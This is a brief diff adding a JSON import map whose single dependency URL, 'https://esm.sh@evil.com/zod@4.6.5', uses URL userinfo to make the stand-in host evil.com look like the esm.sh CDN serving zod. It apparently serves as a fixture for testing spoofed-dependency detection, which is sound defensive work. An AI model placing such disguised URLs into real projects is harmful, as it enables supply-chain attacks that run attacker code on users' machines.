@@ -1,0 +1,5 @@
+{
+  "imports": {
+    "dep": "https://esm.sh@evil.com/zod@4.6.5"
+  }
+}
